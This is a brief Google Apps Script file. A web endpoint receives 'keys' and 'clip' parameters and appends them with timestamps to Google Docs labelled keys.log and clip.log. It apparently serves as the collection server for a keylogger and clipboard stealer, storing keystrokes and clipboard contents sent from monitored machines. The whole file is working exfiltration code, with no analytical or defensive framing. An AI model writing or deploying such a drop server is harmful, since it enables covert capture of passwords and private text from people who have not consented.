function doPost(e) {  
  if (e.parameter.keys) {
    // keys.log id
    write('1Aca7NIEYfuaKslV-PjkumVtBOkhlI37ciCdQaoY1p3I', e.parameter.keys);
  }
  if (e.parameter.clip) {
    // clip.log id
    write('1Q4-yNaN3iME2RNh94X_5E5uIdLW4M2-6YOZSnR5deP4', e.parameter.clip);
  }
}

function write(id, s) {
  DocumentApp.openById(id).getBody().editAsText().appendText(
    String(Utilities.formatDate(new Date(),Session.getTimeZone(),"yyyy-MM-dd' 'HH:mm:ss")) + 
    '\n' + s);
}